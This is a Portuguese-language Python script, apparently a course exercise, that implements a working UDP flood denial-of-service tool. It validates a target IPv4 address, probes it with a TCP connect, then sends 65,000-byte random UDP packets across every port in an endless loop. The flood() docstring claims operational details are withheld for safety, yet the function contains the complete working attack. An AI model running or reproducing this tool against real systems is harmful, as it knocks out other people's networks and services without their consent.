"""
Exercício - Elaborar um UDP flood (DoS) para um IP remoto

Este módulo contém funções para:
- Validar um endereço IPv4;
- Verificar conectividade básica a um IP (tentativa TCP);
- Fluxo principal com menu em linha de comandos.

"""

import socket
import random
import os
import time
import errno

def ip_valido(ip):
    """
    Verifica se uma string corresponde a um endereço IPv4 válido.

    Regras aplicadas:
    - O IP deve ter 4 octetos separados por '.'
    - O 1º e o 4º octeto devem estar entre 1 e 255
    - Os octetos intermédios devem estar entre 0 e 255
    - Apenas dígitos são permitidos em cada octeto

    :param ip: Endereço IP em formato string (ex: "192.168.1.10")
    :return: True se o IP for válido, False caso contrário
    """
    octetos = ip.split(".")

    if len(octetos) != 4:
        return False

    for i, octeto in enumerate(octetos):
        if not octeto.isdigit():
            return False

        numero = int(octeto)

        if i == 0 or i == 3:
            if numero < 1 or numero > 255:
                return False
        else:
            if numero < 0 or numero > 255:
                return False
    return True

def ip_responde(ip):
    """
    Testa se um IP aparenta estar 'ativo' usando uma tentativa de ligação TCP.

    Nota:
    - Usa connect_ex para a porta 1/TCP com timeout curto.
    - Considera resposta válida tanto ligação bem-sucedida (0),
      como 'connection refused' (ECONNREFUSED), pois indica que o host respondeu.

    :param ip: Endereço IP (string)
    :return: True se o host aparenta responder, False caso contrário
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    try:
        estado_ligacao = sock.connect_ex((ip, 1))
    finally:
        sock.close()

    if estado_ligacao == 0:
        return True
    if estado_ligacao == errno.ECONNREFUSED:
        return True

    return False

def flood(ip):
    """
    Função do exercício que envia tráfego de rede.

    Por motivos de segurança, não descrevo aqui instruções operacionais
    nem detalhes que aumentem a capacidade de uso ofensivo.

    :param ip: Endereço IP (string)
    :return: None
    """
    if not ip_responde(ip):
        print(f"{ip} - IP não encontrado")
        return

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    pacote = random._urandom(65000)
    contador = 0

    while True:
        for i in range(1,65536):
            porta = i
            sock.sendto(pacote,(ip, porta))
            print(f"Pacote {contador} | Destino: {ip} | Porta: {porta}")
            contador = contador + 1
            time.sleep(0.0001) #1/10000 segundos

def menu():
    """
    Solicita ao utilizador um endereço IP válido.

    O pedido repete até o utilizador introduzir um IP válido segundo ip_valido().

    :return: IP válido introduzido pelo utilizador (string)
    """
    while True:
        ip = input("Introduza o IP que pretende fazer o ataque: ").strip()
        if ip_valido(ip):
            break
        print("Introduza um IP válido.")

    return ip

def main():
    """
    Função principal do programa.

    - Limpa o ecrã
    - Mostra um título (via figlet, se existir no sistema)
    - Pede um IP ao utilizador
    - Executa o fluxo principal
    """
    os.system('clear')
    os.system('figlet UDP Flood')

    print("\nO script pede apenas o IP da máquina alvo do UDP Flood.\n")

    ip = menu()
    flood(ip)


if __name__ == "__main__":
    main()
